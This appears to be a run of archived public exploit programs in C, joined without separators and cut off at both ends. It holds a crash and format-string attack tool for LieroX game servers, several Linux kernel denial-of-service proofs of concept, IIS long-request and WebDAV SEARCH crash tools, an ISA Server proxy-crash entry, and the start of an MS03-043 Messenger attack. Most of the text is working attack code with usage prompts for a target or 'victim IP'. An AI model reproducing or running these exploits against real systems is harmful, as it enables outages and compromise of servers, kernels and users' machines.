    #include <sys/types.h>
    #include <arpa/inet.h>
    #include <netinet/in.h>
    #include <netdb.h>

    #define stricmp strcasecmp
    #define stristr strcasestr
    #define ONESEC  1
#endif



#define VER         "0.1"
#define BUFFSZ      4096
#define PORT        23400
#define TIMEOUT     1
#define TWAIT       5
#define CRASHSZ     200     // 128 or more
#define FSTRING     "%02000x"



void delimit(u_char *data);
void show_info(u_char *data);
int lierox_build_pck(u_char *buff, u_char *cmd, u_char *id, ...);
int mycpy(u_char *dst, u_char *src);
int send_recv(int sd, u_char *in, int insz, u_char *out, int outsz, int err);
int create_rand_string(u_char *data, int len, u_int rnd);
int timeout(int sock);
u_int resolv(char *host);
void std_err(void);



struct  sockaddr_in peer;



int main(int argc, char *argv[]) {
    struct  sockaddr_in peerl;
    u_int   seed;
    int     sd,
            len,
            attack;
    u_short port = PORT;
    u_char  password[33],
            nick[CRASHSZ + 1],
            buff[BUFFSZ],
            id[4],          // I use char for endian compatibility
            *cmd,
            *details;

#ifdef WIN32
    WSADATA    wsadata;
    WSAStartup(MAKEWORD(1,0), &wsadata);
#endif


    setbuf(stdout, NULL);

    fputs("\n"
        "LieroX <= 0.62b multiple vulnerabilities " VER "\n"
        "by Luigi Auriemma\n"
        "e-mail: aluigi@autistici.org\n"
        "web:    http://aluigi.altervista.org\n"
        "\n", stdout);

    if(argc < 3) {
        printf("\n"
            "Usage: %s <attack> <host> [port(%hu)]\n"
            "\n"
            "Attack:\n"
            "1 = server crash/freeze\n"
            "2 = in-game nickname format string versus all the clients in the server\n"
            "\n", argv[0], port);
        exit(1);
    }

    attack = atoi(argv[1]);
    if(argc > 3) port = atoi(argv[3]);

    peer.sin_addr.s_addr  = resolv(argv[2]);
    peer.sin_port         = htons(port);
    peer.sin_family       = AF_INET;

    peerl.sin_addr.s_addr = INADDR_ANY;
    peerl.sin_port        = htons(time(NULL));
    peerl.sin_family      = AF_INET;

    printf("- target   %s : %hu\n",
        inet_ntoa(peer.sin_addr), port);

    seed = time(NULL);
    cmd  = buff + 8;
    *password = 0;

    fputs("- request informations\n", stdout);
    sd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if(sd < 0) std_err();

    len = lierox_build_pck(buff, "query", NULL);
    *(u_short *)(buff + len) = ~seed;
    len += 2;

    len = send_recv(sd, buff, len, buff, sizeof(buff), 1);
    show_info(buff);
    close(sd);

    sd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if(sd < 0) std_err();

redo:
    len = lierox_build_pck(buff, "getchallenge", NULL);
    len = send_recv(sd, buff, len, buff, sizeof(buff), 1);

    if(stricmp(cmd, "challenge")) {
        printf("\n"
            "Error: wrong challenge reply received:\n"
            "       %s\n"
            "\n", cmd);
        exit(1);
    }
    memcpy(id, cmd + 10, 4);

    seed = create_rand_string(nick, sizeof(nick), seed);

    if(attack == 1) {
        // the bug is NOT in the nickname, we must
        // simply send a big parameter or value!
        printf("- server crash/freeze attack (%d bytes)\n", sizeof(nick) - 1);
        memset(nick, 'a', sizeof(nick) - 1);
        nick[sizeof(nick) - 1] = 0;

    } else if(attack == 2) {
        printf("- client format string attack\n");
        strcpy(nick, FSTRING);

    } else {
        printf("\nError: wrong attack number selected\n\n");
        exit(1);
    }

    len = lierox_build_pck(buff, "connect", id,
        "name",         nick,
        "skin",         "default.png",  // directory traversal but not exploitable
        "col_r",        "128",
        "col_g",        "200",
        "col_b",        "255",
        "packet_size",  "400",
        "update_rate",  "8",
        "spectator",    "0",
        "pass",         password,
        NULL,           NULL);

    len = send_recv(sd, buff, len, buff, sizeof(buff), 0);
    if(len < 0) {
        if(attack == 1) {
            printf("\n- server seems crashed, I check it:\n");
            len = lierox_build_pck(buff, "ping", NULL);
            *(u_short *)(buff + len) = ~seed;
            len += 2;
            len = send_recv(sd, buff, len, buff, sizeof(buff), 0);
            if(len < 0) {
                printf("\n  Server IS vulnerable!!!\n\n");
            } else {
                printf("\n  Server doesn't seem vulnerable\n\n");
            }
        }

    } else {
        details = cmd + strlen(cmd) + 1;
        if(details >= (buff + len)) details = "";

        if(!stricmp(cmd, "goodconnection")) {
            printf("\n"
                "- the player is now in the server\n"
                "  any client inside it should have been crashed\n\n");

            /* // if you need to send commands:
            *(u_int *)buff       = 0 | 0x80000000;
            *(u_int *)(buff + 4) = 1;
            buff[8] = 1;
            len = 9 + mycpy(buff + 9, "command if needed");
            len = send_recv(sd, buff, len, buff, sizeof(buff), 0);
            */

        } else if(!stricmp(cmd, "badpassword")) {
            printf("\n- server is protected. Insert the password required:\n  ");
            fflush(stdin);
            fgets(password, sizeof(password), stdin);
            delimit(password);
            goto redo;

        } else {
            printf("\n- player not accepted (%s)\n\n", details);
        }
    }

    close(sd);
    return(0);
}



void delimit(u_char *data) {
    while(*data && (*data != '\n') && (*data != '\r')) data++;
    *data = 0;
}



void show_info(u_char *data) {
    data += 8;
    data += strlen(data) + 1 + 2 + 2;

    printf("\n  Name:      %s\n", data);
    data += strlen(data) + 1;

    printf("  Players:   %hhu/%hhu\n", data[0], data[1]);
    data += 3;

    printf("  Mod:       %s\n", data);
    data += strlen(data) + 1;

    printf("  Game:      %s\n", data);
    data += strlen(data) + 1;
}



int lierox_build_pck(u_char *buff, u_char *cmd, u_char *id, ...) {
    va_list ap;
    u_char  *par,
            *val,
            *p;

    p = buff;

    memcpy(p, "\xff\xff\xff\xff", 4);
    p += 4;

    memcpy(p, "lx::", 4);
    p += 4;

    p += mycpy(p, cmd);

    if(id) {
        *p++ = 13;
        memcpy(p, id, 4);
        p += 4;

        va_start(ap, id);
        while((par = va_arg(ap, u_char *)) && (val = va_arg(ap, u_char *))) {
            p += mycpy(p, par);
            *(p - 1) = ';';
            p += mycpy(p, val);
            *(p - 1) = '/';
        }
        va_end(ap);

        *p++ = 0;
    }

    return(p - buff);
}



int mycpy(u_char *dst, u_char *src) {
    u_char  *p;

    for(p = dst; *src; src++, p++) {
        *p = *src;
    }
    *p++ = 0;
    return(p - dst);
}



int send_recv(int sd, u_char *in, int insz, u_char *out, int outsz, int err) {
    int     retry,
            len;

    for(retry = 3; retry; retry--) {
        if(sendto(sd, in, insz, 0, (struct sockaddr *)&peer, sizeof(peer))
          < 0) std_err();
        fputc('.', stdout);
        if(!timeout(sd)) break;
    }

    if(!retry) {
        if(!err) return(-1);
        fputs("\nError: socket timeout, no reply received\n\n", stdout);
        exit(1);
    }

    len = recvfrom(sd, out, outsz, 0, NULL, NULL);
    if(len < 0) std_err();
    fputc('.', stdout);

    return(len);
}



int create_rand_string(u_char *data, int len, u_int rnd) {
    const static u_char table[] =
                "0123456789"
                "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
                "abcdefghijklmnopqrstuvwxyz";

    len = rnd % len;
    if(len < 3) len = 3;

    while(--len) {
        rnd = (rnd * 0x343FD) + 0x269EC3;
        rnd >>= 3;
        *data++ = table[rnd % (sizeof(table) - 1)];
    }
    *data = 0;

    return(rnd);
}



int timeout(int sock) {
    struct  timeval tout;
    fd_set  fd_read;
    int     err;

    tout.tv_sec  = TIMEOUT;
    tout.tv_usec = 0;
    FD_ZERO(&fd_read);
    FD_SET(sock, &fd_read);
    err = select(sock + 1, &fd_read, NULL, NULL, &tout);
    if(err < 0) std_err();
    if(!err) return(-1);
    return(0);
}



u_int resolv(char *host) {
    struct  hostent *hp;
    u_int   host_ip;

    host_ip = inet_addr(host);
    if(host_ip == INADDR_NONE) {
        hp = gethostbyname(host);
        if(!hp) {
            printf("\nError: Unable to resolv hostname (%s)\n", host);
            exit(1);
        } else host_ip = *(u_int *)(hp->h_addr);
    }
    return(host_ip);
}



#ifndef WIN32
    void std_err(void) {
        perror("\nError");
        exit(1);
    }
#endif

// milw0rm.com [2006-03-06]
/*

Linux Kernel 2.6.27.7-generic - 2.6.18 - 2.6.24-1 Denial of service Exploit

Vuln : 2.6.27.7-generic || 2.6.18 || 2.6.24-1

Author : Adurit team
             >>djekmani4ever

Home : Hightsec.com

patch : http://marc.info/?l=linux-netdev&m=122841256115780&w=2

*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <linux/atm.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/stat.h> 
                      
#define NUM_CPUS 8    
#define ATM "/proc/net/atm/avc"
                              
int                           
main(void)                    
{                             
    char *err, adurit[2000];  
    int i, ret, sock, proc;   
    struct atm_qos dj;        
    struct sockaddr_atmsvc addr;
                               
                               
                               
    sock = socket(PF_ATMSVC, SOCK_DGRAM, 0);
                                           
                                           
    memset(&dj, 0, sizeof(dj));            
    dj.rxtp.traffic_class = ATM_UBR;       
    dj.txtp.traffic_class = ATM_UBR;       
    dj.aal = ATM_NO_AAL;                   
                                           

    ret = setsockopt(sock, SOL_ATM, SO_ATMQOS, &dj, sizeof(dj));
    if (ret == -1) {
        printf("failed !\n");
        return 1;
    }
    memset(&addr, 0, sizeof(addr));
    addr.sas_family = AF_ATMSVC;
 
    bind(sock, (struct sockaddr *) &addr, sizeof(addr));
 
    listen(sock, 10);
    listen(sock, 10);

    for (i = 1; i < NUM_CPUS; ++i) {
        if (fork() != 0) {
            break;
        }
    }
    proc = open(ATM, O_RDONLY);
    ret = read(proc, &adurit, 2000);
    close(proc);

    return 0;
}

// milw0rm.com [2008-12-14]
int main()
{ 
static long long a[1024 * 1024 * 20] = { 0 }; 

return a;

}source: http://www.securityfocus.com/bid/15156/info

Linux Kernel is reported prone to a local denial-of-service vulnerability.

This issue arises from an infinite loop when binding IPv6 UDP ports. 

/*
 * Linux kernel
 * IPv6 UDP port selection infinite loop
 * local denial of service vulnerability
 * proof of concept code
 * version 1.0 (Oct 29 2005)
 * CVE ID: CAN-2005-2973
 *
 * by Remi Denis-Courmont < exploit at simphalempin dot com >
 *   http://www.simphalempin.com/dev/
 *
 * Vulnerable:
 *  - Linux < 2.6.14 with IPv6
 *
 * Not vulnerable:
 *  - Linux >= 2.6.14
 *  - Linux without IPv6
 *
 * Fix:
 * http://www.kernel.org/git/?p=linux/kernel/git/torvalds/linux-2.6.git;
 * a=commit;h=87bf9c97b4b3af8dec7b2b79cdfe7bfc0a0a03b2
 */


/*****************************************************************************
 * Copyright (C) 2005  Remi Denis-Courmont.  All rights reserved.            *
 *                                                                           *
 * Redistribution and use in source and binary forms, with or without        *
 * modification, are permitted provided that the following conditions        *
 * are met:                                                                  *
 * 1. Redistributions of source code must retain the above copyright notice, *
 *    this list of conditions and the following disclaimer.                  *
 * 2. Redistribution in binary form must reproduce the above copyright       *
 *    notice, this list of conditions and the following disclaimer in the    *
 *    documentation and/or other materials provided with the distribution.   *
 *                                                                           *
 * The author's liability shall not be incurred as a result of loss of due   *
 * the total or partial failure to fulfill anyone's obligations and direct   *
 * or consequential loss due to the software's use or performance.           *
 *                                                                           *
 * The current situation as regards scientific and technical know-how at the *
 * time when this software was distributed did not enable all possible uses  *
 * to be tested and verified, nor for the presence of any or all faults to   *
 * be detected. In this respect, people's attention is drawn to the risks    *
 * associated with loading, using, modifying and/or developing and           *
 * reproducing this software.                                                *
 * The user shall be responsible for verifying, by any or all means, the     *
 * software's suitability for its requirements, its due and proper           *
 * functioning, and for ensuring that it shall not cause damage to either    *
 * persons or property.                                                      *
 *                                                                           *
 * THIS SOFTWARE IS PROVIDED BY THE AUTHOR ``AS IS'' AND ANY EXPRESS OR      *
 * IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES *
 * OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED.   *
 * IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT, INDIRECT,          *
 * INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT  *
 * NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, *
 * DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY     *
 * THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT       *
 * (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF  *
 * THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.         *
 *                                                                           *
 * The author does not either expressly or tacitly warrant that this         *
 * software does not infringe any or all third party intellectual right      *
 * relating to a patent, software or to any or all other property right.     *
 * Moreover, the author shall not hold someone harmless against any or all   *
 * proceedings for infringement that may be instituted in respect of the     *
 * use, modification and redistrbution of this software.                     *
 *****************************************************************************/


#include <stdio.h>
#include <string.h>
#include <stdlib.h>

#include <errno.h>
#include <sys/time.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <sys/resource.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>

static int
bind_udpv6_port (uint16_t port)
{
	int fd;

	fd = socket (AF_INET6, SOCK_DGRAM, IPPROTO_UDP);
	if (fd != -1)
	{
		struct sockaddr_in6 addr;
		int val = 1;

		setsockopt (fd, SOL_SOCKET, SO_REUSEADDR, &val, sizeof (val));

		memset (&addr, 0, sizeof (addr));
		addr.sin6_family = AF_INET6;
		addr.sin6_port = htons (port);
		if (bind (fd, (struct sockaddr *)&addr, sizeof (addr)) == 0)
			return fd;

		close (fd);
	}
	return -1;
}


static int
get_fd_limit (void)
{
	struct rlimit lim;

	getrlimit (RLIMIT_NOFILE, &lim);
	lim.rlim_cur = lim.rlim_max;
	setrlimit (RLIMIT_NOFILE, &lim);
	return (int)lim.rlim_max;
}


static void
get_port_range (uint16_t *range)
{
	FILE *stream;

	/* conservative defaults */
	range[0] = 1024;
	range[1] = 65535;

	stream = fopen ("/proc/sys/net/ipv4/ip_local_port_range", "r");
	if (stream != NULL)
	{
		unsigned i[2];

		if ((fscanf (stream, "%u %u", i, i + 1) == 2)
		 && (i[0] <= i[1]) && (i[1] < 65535))
		{
			range[0] = (uint16_t)i[0];
			range[1] = (uint16_t)i[1];
		}
		fclose (stream);
	}
}


/* The criticial is fairly simple to raise : the infinite loop occurs when
 * calling bind with no speficied port number (ie zero), if and only if the
 * IPv6 stack cannot find any free UDP port within the local port range
 * (normally 32768-61000). Because this requires times more sockets than what
 * a process normally can open at a given time, we have to spawn several
 * processes. Then, the simplest way to trigger the crash condition consists
 * of opening up kernel-allocated UDP ports until it crashes, but that is
 * fairly slow (because allocation are stored in small a hash table of lists,
 * that are checked at each allocation). A much faster scheme involves getting
 * the local port range from /proc, allocating one by one, and only then, ask
 * for automatic (any/zero) port allocation.
 */
static int
proof (void)
{
	int lim, val = 2;
	pid_t pid, ppid;
	uint16_t range[2], port;

	lim = get_fd_limit ();
	if (lim <= 3)
		return -2;

	get_port_range (range);

	port = range[0];
	ppid = getpid ();

	puts ("Stage 1...");
	do
	{
		switch (pid = fork ())
		{
			case 0:
				for (val = 3; val < lim; val++)
					close (val);

				do
				{
					if (bind_udpv6_port (port) >= 0)
					{
						if (port)
							port++;
					}
					else
					if (port && (errno == EADDRINUSE))
						port++; /* skip already used port */
					else
					if (errno != EMFILE)
						/* EAFNOSUPPORT -> no IPv6 stack */
						/* EADDRINUSE -> not vulnerable */
						exit (1);

					if (port > range[1])
					{
						puts ("Stage 2... should crash quickly");
						port = 0;
					}
				}
				while (errno != EMFILE);

				break; /* EMFILE: spawn new process */

			case -1:
				exit (2);

			default:
				wait (&val);
				if (ppid != getpid ())
					exit (WIFEXITED (val) ? WEXITSTATUS (val) : 2);
		}
	}
	while (pid == 0);

	puts ("System not vulnerable");
	return -val;
}

int
main (int argc, char *argv[])
{
	setvbuf (stdout, NULL, _IONBF, 0);
	puts ("Linux kernel IPv6 UDP port infinite loop vulnerability\n"
	      "proof of concept code\n"
	      "Copyright (C) 2005 Remi Denis-Courmont "
	      "<\x65\x78\x70\x6c\x6f\x69\x74\x40\x73\x69\x6d\x70"
	      "\x68\x61\x6c\x65\x6d\x70\x69\x6e\x2e\x63\x6f\x6d>\n");

	return -proof ();
}

/* ----------------------------------------------------------------------------------------------------
 * cve-2014-7822_poc.c
 * 
 * The implementation of certain splice_write file operations in the Linux kernel before 3.16 does not enforce a restriction on the maximum size of a single file
 * which allows local users to cause a denial of service (system crash) or possibly have unspecified other impact via a crafted splice system call, 
 * as demonstrated by use of a file descriptor associated with an ext4 filesystem. 
 *
 * 
 * This is a POC to reproduce vulnerability. No exploitation here, just simple kernel panic.
 * Works on ext4 filesystem
 * Tested on Ubuntu with 3.13 and 3.14 kernels
 * 
 * Compile with gcc -fno-stack-protector -Wall -o cve-2014-7822_poc cve-2014-7822_poc.c   
 * 
 * 
 * Emeric Nasi - www.sevagas.com
 *-----------------------------------------------------------------------------------------------------*/


/* -----------------------   Includes ----------------------------*/

#define _GNU_SOURCE
#include <fcntl.h>
#include <stdio.h>
#include <unistd.h>
#include <errno.h>
#include <string.h>
#include <stdlib.h>
#include <limits.h>

#define EXPLOIT_NAME "cve-2014-7822"
#define EXPLOIT_TYPE DOS

#define JUNK_SIZE 30000

/* -----------------------   functions ----------------------------*/


/* Useful:
 * 
+============+===============================+===============================+
| \ File flag|                               |                               |
|      \     |     !EXT4_EXTENTS_FL          |        EXT4_EXTETNS_FL        |
|Fs Features\|                               |                               |
+------------+-------------------------------+-------------------------------+
| !extent    |   write:      2194719883264   | write:       --------------   |
|            |   seek:       2199023251456   | seek:        --------------   |
+------------+-------------------------------+-------------------------------+
|  extent    |   write:      4402345721856   | write:       17592186044415   |
|            |   seek:      17592186044415   | seek:        17592186044415   |
+------------+-------------------------------+-------------------------------+
*/


/**
 * Poc for cve_2014_7822 vulnerability
 */
int main()
{
    int pipefd[2];
    int result;
    int in_file;
    int out_file;
    int zulHandler;
    loff_t viciousOffset = 0;
    
    char junk[JUNK_SIZE]  ={0};
    
    result = pipe(pipefd);
 
    // Create and clear zug.txt and zul.txt files
    system("cat /dev/null > zul.txt");
    system("cat /dev/null > zug.txt");
    
    // Fill zul.txt with A
    zulHandler = open("zul.txt", O_RDWR);
    memset(junk,'A',JUNK_SIZE);
    write(zulHandler, junk, JUNK_SIZE);
  close(zulHandler);

  //put content of zul.txt in pipe
  viciousOffset = 0;
   in_file = open("zul.txt", O_RDONLY);
    result = splice(in_file, 0, pipefd[1], NULL, JUNK_SIZE, SPLICE_F_MORE | SPLICE_F_MOVE);
    close(in_file);
  

  // Put content of pipe in zug.txt
  out_file = open("zug.txt", O_RDWR); 
  viciousOffset =   118402345721856; // Create 108 tera byte file... can go up as much as false 250 peta byte ext4 file size!!
  printf("[cve_2014_7822]: ViciousOffset = %lu\n", (unsigned long)viciousOffset);
            
    result = splice(pipefd[0], NULL, out_file, &viciousOffset, JUNK_SIZE , SPLICE_F_MORE | SPLICE_F_MOVE); //8446744073709551615
    if (result == -1)
    {
        printf("[cve_2014_7822 error]: %d - %s\n", errno, strerror(errno));
        exit(1);
  }
    close(out_file);

    close(pipefd[0]);
    close(pipefd[1]);
    
    
    //Open  zug.txt 
  in_file = open("zug.txt", O_RDONLY);
    close(in_file);
   
  printf("[cve_2014_7822]: POC triggered, ... system will panic after some time\n");
  
  return 0;
}
source: http://www.securityfocus.com/bid/2654/info

Microsoft Internet Information Server is vulnerable to a denial of service.

This particular denial of service affects versions 2.0, 3.0 and 4.0 of the server prior to service pack 4.

The URL which causes this issue is of the format "http://server/?anything=XXXXX" - note that no existing file need be requested.

This is not a buffer overflow; a URL of specific length must be sent (between 4k and 8k), anything longer or shorter will not affect the server. 

/* Some days ago I found the page http://www.eden.com/~tfast/jihad.html
   Then I found the java program IIServerSlayer.class made by
   Todd Fast <tfast@eden.com>, the author of the web pages.
   Now I have ported that program in gcc from java using strace and
   disassembling IIServerSlayer.class with javap (part of jdk).

   For now is tested by me only on Linux 2.1.42 compiled with gcc 2.7.2.2
   and glibc.
                by Andrea Arcangeli <arcangeli@mbox.queen.it> */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <netdb.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <signal.h>

int s;
struct sockaddr_in addr, spoofedaddr;
struct hostent *host;

int open_sock(int sock, char *server, int port) {
  struct sockaddr_in blah;
  struct hostent *he;
  bzero((char *)&blah,sizeof(blah));
  blah.sin_family=AF_INET;
  blah.sin_port=htons(port);
  if ((he = gethostbyname(server)) != NULL) {
    bcopy(he->h_addr, (char *)&blah.sin_addr, he->h_length);
  }
  else {
    if ((blah.sin_addr.s_addr = inet_addr(server)) < 0) {
      perror("gethostbyname()");
      return(2);
    }
  }
  if (connect(sock,(struct sockaddr *)&blah,16)==-1) {
    perror("connect()");
    close(sock);
    return(3);
  }
  return 0;
}

char *generate_die_string(int lenght) {
  char letter='X';
  char *str_begin = "GET /?bye=",*str_end = " HTTP/1.0\r\n\r\n",*str;
  int i;
  str = (char *)malloc(lenght+strlen(str_end)+strlen(str_begin)+1);
  strcpy(str,str_begin);
  for(i=strlen(str_begin);i<lenght+strlen(str_begin);i++) str[i] = letter;
  str[i]=0;
  strcat(str,str_end);
  return (char *)str;
}

void IIServerSlayer(char *target,int lenght,int port,int flags) {
  char buff[2],header[512],*IIS_string = "Server: Microsoft-IIS/3.0";
  char *IIS_patch = "Bad Request";
  int count = 0,return_status;
  if ((s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) == -1) {
    perror("socket()");
    exit(1);
  }
  if((return_status = open_sock(s,target,port))) exit(return_status);
  if(lenght) printf("Sending request lenght = %d to %s\n",lenght,target);
  else printf("Sending request to test if %s is a Microsoft-IIS/3.0 server\n"
              ,target);
  send(s,generate_die_string(lenght),strlen(generate_die_string(lenght)),0);
  printf("Waiting for the reply from %s\n",target);
  buff[1]=0;
  while(recv(s,buff,1,0) == 1) {
    if(flags & 1) printf("%s",buff);
    else if(!div(count,50).rem) printf(".");
    if(count < 511) header[count]=buff[0];
    count++;
  }
  printf("\n");
  header[511]=0;
  if(strstr(header,IIS_string) == NULL && lenght == 0) {
    printf("This is not a Microsoft-IIS/3.0 web server\n");
    if(!(flags & 2)) exit(0);
  }
  else if(!lenght) printf("Ok, this is a Microsoft-IIS/3.0 web server\n");
  if(strstr(header,IIS_patch) != NULL) {
    printf("This IIS/3.0 web server is patched against this exploit\n");
    if(!(flags & 2)) exit(0);
  }
  close(s);
}

void main(int argc,char **argv)
{
  int i = 1,port = 80,lenght = 8180,flags = 0,param = 0,pid;
  if (argc < 2 ) {
    printf("Usage: %s [-v] [-f] <target> [string_lenght] [port]\n",argv[0]);
    printf("[-v] = verbose mode to view the server reply\n");
    printf("[-f] = force running over non or patched IIS/3.0 web server\n");
    exit(0);
  }
  for(i=1;i<argc;i++) {
    if(!strcmp(argv[i],"-v")) { param++; flags |= 1; }
    if(!strcmp(argv[i],"-f")) { param++; flags |= 2; }
  }
  if(argc > param+2) lenght = atoi(argv[param+2]);
  if(argc > param+3) port = atoi(argv[param+3]);
  for(i=0;i<3;i++,lenght++) {
    if(i) IIServerSlayer(argv[param+1],lenght,port,flags);
    else IIServerSlayer(argv[param+1],0,port,flags);
    if(i == 1 || i == 0) lenght--;
  }
  if((pid = fork())) {
    if(pid == -1) {
      perror("I can' t fork\n");
      exit(-1);
    }
    usleep(60000000); /* wait for 1 minute */
    kill(pid,SIGTERM);
  }
  else {
    IIServerSlayer(argv[param+1],lenght,port,flags);
    printf("Sorry, %s is alive yet\n",argv[param+1]);
  }
  exit(0);
}




/*
source: http://www.securityfocus.com/bid/7735/info

Microsoft Internet Information Services has been reported vulnerable to a denial of service.

When WebDAV receives excessively long requests to the 'PROPFIND' or 'SEARCH' variables, the IIS service will fail. All current web, FTP, and email sessions will be terminated.

IIS will automatically restart and normal service will resume.

** It has been reported that if a WebDAV request with a certain number of bytes is received, the Inetinfo service will remain alive but cease serving requests. This will cause the IIS server to stop serving requests until the service is manually restarted.
*/

/*
IIS eXploit. by velan. Greetz to: Shashank Pandey a.k.a +(Neo1)+
Bid:  7735
*/

#define ERROR -1
#define OK 1

#ifdef HAVE_CONFIG_H
#include <config.h>
#endif

#include <stdio.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <string.h>

int check_for_iis();
void screw_iis();
void usage();

char IP[15];

int main(int argc, char *argv[])
{
/*  cout << "Hello, World!" << endl;  */

   if(argc !=2)
   {
      usage();  exit(0);
   }

   printf("IIS eXploit. by velan. Greetz to: Shashank Pandey a.k.a +(Neo1)+\n");

   strcpy(IP, argv[1]);

   if(check_for_iis() != OK)
   {
      printf("Sorry, BAD LUCK! \n");    exit(0);
   }

   screw_iis();

  return EXIT_SUCCESS;
}

int check_for_iis()
{
  int sck, flag = 1;
  struct sockaddr_in sin;
  char req[50];

  sck = socket(AF_INET, SOCK_STREAM, 0);
  if(sck == ERROR)
  {
    perror("Socket error ");      exit(0);
  }

  sin.sin_port = htons(80);
  sin.sin_family = AF_INET;
  sin.sin_addr.s_addr = inet_addr(IP);

  if ((connect(sck, (struct sockaddr *) &sin, sizeof(sin))) == -1)
  {
    perror("Connect Error ");     exit(0);
  }

  strcpy(req, "GET / HTTP/1.0\r\n\n");
  send(sck, req, sizeof(req), 0);
  recv(sck, req, sizeof(req), 0);

  if (strstr(req,"IIS") == NULL)
  {
    printf(" Not an IIS server! \n");
    flag = 0;
  }

  sprintf(req,"SEARCH / HTTP/1.0\r\n\n",40);
  send(sck, req, sizeof(req), 0);
  recv(sck, req, sizeof(req), 0);

  if (strstr(req,"HTTP/1.1 411 Length Required") == NULL)
  {
    printf("METHOD SEARCH NOT ALLOWED. \n");
    flag = 0;
  }

  return(flag);
}



void screw_iis()
{
  int sck, flag = 1;
  struct sockaddr_in sin;
  char junk[100];
  char buffer[65535] ="";
  char request[80000];
  char content[] =
           "<?xml version=\"1.0\"?>\r\n"
           "<g:searchrequest xmlns:g=\"DAV:\">\r\n"
           "<g:sql>\r\n"
           "Select \"DAV:displayname\" from scope()\r\n"
           "</g:sql>\r\n"
           "</g:searchrequest>\r\n";


  sck = socket(AF_INET, SOCK_STREAM, 0);
  if(sck == ERROR)
  {
    perror("Socket error ");      exit(0);
  }

  sin.sin_port = htons(80);
  sin.sin_family = AF_INET;
  sin.sin_addr.s_addr = inet_addr(IP);

  if ((connect(sck, (struct sockaddr *) &sin, sizeof(sin))) == -1)
  {
    perror("Connect Error ");     exit(0);
  }

  buffer[sizeof(buffer)]=0x00;

  memset(buffer,'S',sizeof(buffer));
  memset(request,0,sizeof(request));
  memset(junk,0,sizeof(junk));

  sprintf(request,"SEARCH /%s HTTP/1.1\r\nHost: %s\r\nContent-type: text/xml\r\nCon
tent-Length: ",buffer,IP);
  sprintf(request,"%s%d\r\n\r\n",request,strlen(content));

  printf("\r\nScrewing the server... \n");

  send(sck,request,strlen(request),0);

  send(sck,content,strlen(content),0);

  recv(sck,junk,sizeof(junk),0);

  if(junk[0]==0x00)
  {
     printf("Server is Screwed! \r\n");
  }
  else
  {
      printf("BAD LUCK. Patched.\n");
  }
}



void usage()
{
  printf("IIS eXploit. by velan. Greetz to: Shashank Pandey a.k.a +(Neo1)+\n");
  printf("Usage\r\n");
  printf("Screw_IIS <victim IP>\n");
}
source: http://www.securityfocus.com/bid/2600/info

It is possible for a user to cause the Web Proxy service on a host running MS ISA Server to stop responding.

If a HTTP request with an unusually long path is submitted, the Web Proxy service could stop responding.

This vulnerability is only exploitable from the internal network unless the Web Publishing service has been enabled, in which case it can be exploited from either internal or external networks. It is disabled by default.

A HTML email containing the malicious URL in an image tag or a javascript URL, could invoke a user's browser. An attempt to fulfill this request by the Web Proxy service, could instigate the denial of service condition on an internal users system. This is a potential way a remote attacker could exploit this vulnerability even if Web Publishing is disabled.

* It has been reported that the execution of arbitrary commands is possible. If this is the case the complete remote compromise of the host may be achievable. The latest findings have not been confirmed by anyone other than the person who posted about it. 

/*
 * repeat.c -- quick-n-dirty hack to output argv[2] instances of the
 * character whose ASCII value is given as argv[1]
 *
 * WARNING - this has absolutely no error checking!
 */

#include <stdio.h>

main (int argc, char **argv) {
  int character;
  long repetitions, i;

  if ( argc != 3 ) {
    printf("usage: repeat char reps\n");
    exit(1);
  }
  character = atoi(argv[1]);
  repetitions = atol(argv[2]);

  for (i = 0L; i < repetitions; i++) {
    printf ("%c", character);
  }
}/* 
Mon Oct 20 14:26:55 NZDT 2003 
  
Re-written By VeNoMouS to be ported to linux, and tidy it up a little. 
This was only like a 5 minute port but it works and has been tested. 
venomgen-x.co.nz <mailto:venomgen-x.co.nz> 
  
greets to str0ke and defy 
  


DoS Proof of Concept for MS03-043 - exploitation shouldn't be too hard. 
Launching it one or two times against the target should make the 
machine reboot. Tested against a Win2K SP4. 
  
"The vulnerability results because the Messenger Service does not 
properly validate the length of a message before passing it to the allocated 
buffer" according to MS bulletin. Digging into it a bit more, we find that 
when 
  
a character 0x14 in encountered in the 'body' part of the message, it is 
replaced by a CR+LF. The buffer allocated for this operation is twice the 
size 
of the string, which is the way to go, but is then copied to a buffer which 
was only allocated 11CAh bytes. Thanks to that, we can bypass the length 
checks 
  
and overflow the fixed size buffer. 
  
Credits go to LSD :) 
  
*/ 
  
#include <stdio.h> 
#include <stdlib.h> 
#include <string.h> 
#include <unistd.h> 
#include <errno.h> 
#include <time.h> 
  
#include <sys/types.h> 
#include <sys/socket.h> 
#include <arpa/inet.h> 
  
  
  
  
  
// Packet format found thanks to a bit a sniffing 
static unsigned char packet_header[] = 
"\x04\x00\x28\x00" 
"\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" 
"\x00\x00\x00\x00\xf8\x91\x7b\x5a\x00\xff\xd0\x11\xa9\xb2\x00\xc0" 
